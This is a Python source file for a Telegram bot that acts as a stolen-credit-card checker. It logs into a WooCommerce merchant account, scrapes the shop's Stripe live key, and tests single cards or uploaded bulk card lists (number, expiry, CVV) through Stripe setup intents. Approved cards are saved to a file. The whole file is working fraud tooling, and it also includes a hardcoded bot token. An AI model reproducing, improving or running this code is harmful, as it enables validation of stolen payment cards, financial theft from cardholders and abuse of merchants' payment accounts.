import logging
import requests
import re
import threading
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from io import BytesIO

BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"  # Replace with your actual bot token

logging.basicConfig(level=logging.INFO)
user_sites = {}
lock = threading.Lock()

def detect_stripe_type(soup):
    if "setup_intent" in soup.text:
        return "setup_intent"
    elif "payment_method" in soup.text:
        return "payment_method"
    elif "source" in soup.text:
        return "source"
    elif "token" in soup.text:
        return "token"
    return "unknown"

def try_login(email, password, login_url, session):
    r = session.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return False, "Login page error."

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload)
    return ("customer-logout" in r.text), r

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args

    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site|email|password")
        return

    try:
        site, email, password = args[0].split("|")
        session = requests.Session()
        login_url = f"https://{site}/my-account/"

        success, resp = try_login(email, password, login_url, session)
        if not success:
            await update.message.reply_text(f"Login failed: {resp}")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        stripe_type = detect_stripe_type(soup)
        pk_live = re.search(r"pk_live_[0-9a-zA-Z]{20,}", resp.text)
        if not pk_live:
            await update.message.reply_text("Could not extract Stripe public key.")
            return

        with lock:
            user_sites[user_id] = {
                "site": site,
                "email": email,
                "password": password,
                "stripe_type": stripe_type,
                "pk_live": pk_live.group()
            }

        await update.message.reply_text(
            f"𝐒𝐢𝐭𝐞: `{site}`\n"
            f"𝐋𝐨𝐠𝐢𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 ✅\n"
            f"𝐒𝐭𝐫𝐢𝐩𝐞 𝐌𝐞𝐭𝐡𝐨𝐝: `{stripe_type}`\n"
            f"𝐏𝐮𝐛𝐥𝐢𝐜 𝐊𝐞𝐲: `{pk_live.group()}`"
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def parse_card(card):
    match = re.match(r"(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})", card)
    if match:
        return match.groups()
    return None

def process_card(card, user_data):
    try:
        parsed = parse_card(card)
        if not parsed:
            return f"{card} -> Invalid format ❌"

        card_number, exp_month, exp_year, cvv = parsed
        site = user_data["site"]
        email = user_data["email"]
        password = user_data["password"]
        stripe_type = user_data["stripe_type"]
        pk_live = user_data["pk_live"]

        login_url = f"https://{site}/my-account/"
        check_url = f"https://{site}/my-account/add-payment-method/"
        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"

        session = requests.Session()
        success, _ = try_login(email, password, login_url, session)
        if not success:
            return f"{card} -> Login failed ❌"

        r = session.get(check_url)
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(\w+)"', r.text)
        if not ajax_nonce:
            return f"{card} -> Could not extract nonce ❌"

        stripe_resp = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={"Authorization": f"Bearer {pk_live}"},
            data={
                "type": "card",
                "card[number]": card_number,
                "card[exp_month]": exp_month,
                "card[exp_year]": exp_year,
                "card[cvc]": cvv,
                "billing_details[address][postal_code]": "10001"
            }
        )
        stripe_json = stripe_resp.json()
        if "error" in stripe_json:
            return f"{card} -> Declined ❌ - {stripe_json['error']['message']}"

        payment_method = stripe_json["id"]
        payload = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": payment_method,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": ajax_nonce.group(1)
        }

        final_resp = session.post(ajax_url, data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
        result = final_resp.json()

        if result.get("success") and result.get("data", {}).get("status") == "succeeded":
            with open("approved.txt", "a") as f:
                f.write(card + "\n")
            return f"{card} -> Approved ✅"
        else:
            reason = result.get("data", {}).get("message", "Declined")
            return f"{card} -> Declined ❌ - {reason}"
    except Exception as e:
        return f"{card} -> Error: {str(e)}"

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sites:
        await update.message.reply_text("Please add a site first using /addsitelogin")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return

    card = context.args[0]
    result = process_card(card, user_sites[user_id])
    await update.message.reply_text(result)

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sites:
        await update.message.reply_text("Please add a site first using /addsitelogin")
        return

    file = await update.message.document.get_file()
    content = await file.download_as_bytes()
    cards = content.decode().splitlines()

    stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0}
    msg = await update.message.reply_text("Starting check...")

    for card in cards:
        stats["total"] += 1
        result = process_card(card, user_sites[user_id])
        if "Approved" in result:
            stats["approved"] += 1
        elif "Declined" in result:
            stats["declined"] += 1
        else:
            stats["errors"] += 1

        await msg.edit_text(
            f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n𝐓𝐨𝐭𝐚𝐥: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
        )

    await update.message.reply_document(document=BytesIO(open("approved.txt", "rb").read()), filename="approved.txt")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), mchk))
    app.run_polling()

if __name__ == "__main__":
    main()
